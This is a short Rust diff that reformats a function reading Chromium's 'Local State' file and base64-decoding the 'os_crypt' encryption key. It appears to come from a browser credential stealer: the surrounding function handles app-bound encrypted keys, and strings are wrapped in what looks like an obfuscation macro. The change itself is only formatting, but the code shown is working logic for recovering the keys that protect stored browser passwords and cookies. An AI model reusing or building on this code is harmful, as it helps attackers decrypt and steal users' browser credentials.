@@ -403,11 +403,15 @@ pub unsafe fn extract_app_bound_encrypted_key(user_data: &Path) -> Option<Vec<u8
 
 fn extract_key(user_data: &Path, key: &str) -> Option<Vec<u8>> {
     let bytes = StorageFileSystem
-        .read_file(&(user_data / s!("Local State")))
+        .read_file(user_data / s!("Local State"))
         .ok()?;
+
     let parsed = parse(&bytes).ok()?;
 
-    let key_in_base64 = parsed.get(s!("os_crypt"))?.get(key)?.as_string()?.clone();
+    let key_in_base64 = parsed.get(s!("os_crypt"))
+        ?.get(key)
+        ?.as_string()
+        ?.clone();
 
     let key = base64_decode_string(&key_in_base64)?;
     Some(key)
